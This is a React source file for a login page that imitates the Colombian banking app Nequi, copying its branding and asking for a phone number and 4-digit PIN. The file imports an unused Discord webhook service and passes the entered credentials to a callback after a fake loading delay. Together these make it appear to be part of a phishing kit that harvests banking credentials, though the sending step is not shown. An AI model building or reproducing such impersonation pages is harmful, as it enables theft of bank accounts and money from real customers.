import { useState } from 'react'
import { NequiLogo } from './NequiLogo'
import { DiscordWebhookService } from '../services/DiscordWebhookService'

interface NequiLoginScreenProps {
  phone: string
  onSuccess: (phoneValue: string, password: string) => void
}

export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
  const [phoneValue, setPhoneValue] = useState(phone)
  const [password, setPassword] = useState('')
  const [confirmed, setConfirmed] = useState(false)
  const [loading, setLoading] = useState(false)

  const isValid = phoneValue.length === 10 && password.length === 4 && confirmed

  function handleSubmit() {
    if (!isValid) return
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
      onSuccess(phoneValue, password)
    }, 2000)
  }

  return (
    <div className="min-h-screen w-full flex flex-col overflow-hidden" style={{ background: '#fce4f0' }}>
      {/* Header */}
      <header className="w-full px-6 flex items-center bg-white shadow-sm" style={{ height: '64px' }}>
        <NequiLogo size="lg" color="dark" />
      </header>

      {/* Background decorative shapes */}
      <div className="relative flex-1 flex items-center justify-center px-4 py-10">
        <div
          className="absolute top-0 right-0 w-64 h-48 rounded-3xl opacity-40"
          style={{ background: '#f4b8d8', transform: 'translate(30%, -20%)' }}
        />
        <div
          className="absolute bottom-0 right-0 w-52 h-52 rounded-3xl opacity-30"
          style={{ background: '#f4b8d8', transform: 'translate(20%, 20%)' }}
        />
        <div
          className="absolute bottom-0 left-0 w-48 h-40 rounded-3xl opacity-30"
          style={{ background: '#f4b8d8', transform: 'translate(-20%, 20%)' }}
        />

        {/* Card */}
        <div
          className="relative w-full max-w-md rounded-3xl px-8 py-10"
          style={{ background: '#fff', boxShadow: '0 4px 40px rgba(230,0,92,0.10)' }}
        >
          <h1 className="text-center text-2xl font-extrabold mb-2" style={{ color: '#2D1B6E' }}>
            Entra a tu Nequi
          </h1>
          <p className="text-center text-sm mb-8 font-medium" style={{ color: '#E6005C' }}>
            Podrás bloquear tu Nequi, consultar tus datos.
          </p>

          {/* Phone field */}
          <div
            className="flex items-stretch mb-3 rounded-xl overflow-hidden"
            style={{ border: '1.5px solid #e5e7eb' }}
          >
            <div
              className="flex items-center gap-2 px-4 py-3 flex-shrink-0"
              style={{ background: '#fafafa', borderRight: '1.5px solid #e5e7eb' }}
            >
              <span className="text-lg leading-none">🇨🇴</span>
              <span className="font-semibold text-sm" style={{ color: '#2D1B6E' }}>+57</span>
              <svg width="10" height="6" viewBox="0 0 10 6" fill="none" style={{ opacity: 0.4 }}>
                <path d="M1 1L5 5L9 1" stroke="#2D1B6E" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={10}
              value={phoneValue}
              onChange={(e) => setPhoneValue(e.target.value.replace(/\D/g, '').slice(0, 10))}
              placeholder="Número de celular"
              className="flex-1 px-4 py-3 text-sm outline-none"
              style={{ color: '#2D1B6E', background: 'transparent' }}
            />
          </div>

          {/* Password field */}
          <div
            className="flex items-center mb-4 rounded-xl overflow-hidden"
            style={{ border: '1.5px solid #e5e7eb' }}
          >
            <input
              type="password"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={4}
              value={password}
              onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 4))}
              placeholder="Contraseña (4 dígitos)"
              className="flex-1 px-4 py-3 text-sm outline-none"
              style={{ color: '#2D1B6E', background: 'transparent' }}
            />
          </div>

          {/* Confirm checkbox — matches image: pink border, pink circle, pink text */}
          <button
            type="button"
            onClick={() => setConfirmed((c) => !c)}
            className="w-full flex items-center gap-4 mb-6 rounded-xl px-5 py-4 transition-all"
            style={{
              border: `2px solid #E6005C`,
              background: confirmed ? '#fff0f6' : '#fff',
              cursor: 'pointer',
            }}
          >
            <div
              className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 transition-all"
              style={{
                border: `2.5px solid #E6005C`,
                background: confirmed ? '#E6005C' : 'transparent',
              }}
            >
              {confirmed && (
                <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                  <path
                    d="M3.5 9.5L7.5 13.5L14.5 5"
                    stroke="white"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              )}
            </div>
            <span
              className="font-semibold text-sm text-center flex-1"
              style={{ color: '#E6005C' }}
            >
              Confirmo que soy una persona real.
            </span>
          </button>

          {/* Submit button — hot pink like image */}
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!isValid || loading}
            className="w-full py-4 rounded-xl font-bold text-base transition-all"
            style={{
              background: isValid ? '#E6005C' : '#f9c0d9',
              color: '#fff',
              cursor: isValid && !loading ? 'pointer' : 'default',
              border: 'none',
            }}
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin" width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeDasharray="60 20" />
                </svg>
                Entrando…
              </span>
            ) : (
              'Entra'
            )}
          </button>
        </div>
      </div>
    </div>
  )
}
